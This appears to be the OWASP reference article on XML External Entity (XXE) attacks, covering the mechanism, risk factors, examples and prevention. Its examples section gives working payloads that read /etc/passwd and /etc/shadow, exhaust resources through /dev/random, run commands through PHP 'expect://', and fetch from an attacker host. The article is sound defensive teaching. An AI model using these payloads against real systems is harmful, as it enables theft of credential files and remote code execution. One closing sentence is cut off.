## Description

An <i>XML External Entity</i> attack is a type of attack against an
application that parses XML input. This attack occurs when <b>XML input
containing a reference to an external entity is processed by a weakly
configured XML parser</b>. This attack may lead to the disclosure of
confidential data, denial of service, server side request forgery, port
scanning from the perspective of the machine where the parser is
located, and other system impacts.

The [XML 1.0 standard](http://www.w3.org/TR/REC-xml/) defines the
structure of an XML document. The standard defines a concept called an
entity, which is a storage unit of some type. There are a few different
types of entities, [external general/parameter parsed
entity](http://www.w3.org/TR/REC-xml/#sec-external-ent) often shortened
to **external entity**, that can access local or remote content via a
declared system identifier. The system identifier is assumed to be a URI
that can be dereferenced (accessed) by the XML processor when processing
the entity. The XML processor then replaces occurrences of the named
external entity with the contents dereferenced by the system identifier.
If the system identifier contains tainted data and the XML processor
dereferences this tainted data, the XML processor may disclose
confidential information normally not accessible by the application.
Similar attack vectors apply the usage of external DTDs, external
stylesheets, external schemas, etc. which, when included, allow similar
external resource inclusion style attacks.

Attacks can include disclosing local files, which may contain sensitive
data such as passwords or private user data, using file: schemes or
relative paths in the system identifier. Since the attack occurs
relative to the application processing the XML document, an attacker may
use this trusted application to pivot to other internal systems,
possibly disclosing other internal content via http(s) requests or
launching a [CSRF](CSRF "wikilink") attack to any unprotected internal
services. In some situations, an XML processor library that is
vulnerable to client-side memory corruption issues may be exploited by
dereferencing a malicious URI, possibly allowing arbitrary code
execution under the application account. Other attacks can access local
resources that may not stop returning data, possibly impacting
application availability if too many threads or processes are not
released.

Note that the application does not need to explicitly return the
response to the attacker for it to be vulnerable to information
disclosures. An attacker can leverage DNS information to exfiltrate data
through subdomain names to a DNS server that he/she controls.

## Risk Factors

  - The application parses XML documents.
  - Tainted data is allowed within the system identifier portion of the
    entity, within the [document type declaration](http://www.w3.org/TR/REC-xml/#sec-prolog-dtd) (DTD).
  - The XML processor is configured to validate and process the DTD.
  - The XML processor is configured to resolve external entities within
    the DTD.

## Examples

The examples below are from [Testing for XML Injection (OWASP-DV-008)](Testing_for_XML_Injection_\(OWASP-DV-008\) "wikilink").

### Accessing a local resource that may not return

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///dev/random" >]>
<foo>&xxe;</foo>
```

## Remote Code Execution

If fortune is on our side, and the PHP "expect" module is loaded, we can
get RCE. Let’s modify the payload

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
  <user>`&xxe;`</user>
  <pass>`mypass`</pass>
</creds>
```

### Disclosing /etc/passwd or other targeted files

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```


```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
<foo>&xxe;</foo>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
<foo>&xxe;</foo>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]>
<foo>&xxe;</foo>
```


## Related [Attacks](https://owasp.org/www-community/attacks/)

  - [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
  - [Blind SQL Injection](Blind_SQL_Injection "wikilink")

## Related [Vulnerabilities](https://owasp.org/www-community/vulnerabilities/)

  - [Missing XML Validation](Missing_XML_Validation "wikilink")

## Related [Controls](https://owasp.org/www-community/controls/)

Since the whole XML document is communicated from an untrusted client,
it's not usually possible to selectively
[validate](Input_Validation "wikilink") or escape tainted data within
the system identifier in the DTD. Therefore, the XML processor should be
configured to use a local static DTD and disallow any declared DTD
included in the XML document.

against XXE attacks is presented in the [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html).
